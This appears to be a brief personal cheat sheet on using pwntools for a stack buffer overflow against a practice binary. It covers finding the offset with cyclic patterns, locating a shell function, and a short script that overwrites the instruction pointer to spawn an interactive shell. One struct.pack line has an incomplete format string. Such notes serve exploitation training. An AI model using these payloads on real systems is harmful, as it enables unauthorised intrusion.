# Pwntools

Enumeration
```bash
r < <(cyclic $INT) # cyclic input of $INT amount
cyclic -l EIP_Address # find out the amount of bytes of input need to expploit the binary
disassemble shell # find out where the shell function is in memory to set it to IP
# EITHER
# IF MANUAL WAY REMEMBER CORRECT ADDRESS LENGTH AND ENDIANNESS
# L->R = littleEndian; R->L = bigEndian
python -c 'print "A"*$INT + "$ADDR"' | /vuln/bin
python -c 'import struct;print "A"*44 + struct.pack("< ", $ADDR)' | /vuln/bin
```

Scripting the buffer overflow
```python
from pwn import *
proc = process('/vuln/bin')
elf = ELF('/vuln/bin')
shell_func = elf.symbols.shell # CHANGE WHATEVER FORMAT REQUIRED
payload = fit({$INT: shell_func })
proc.sendline(payload)
proc.interactive()
```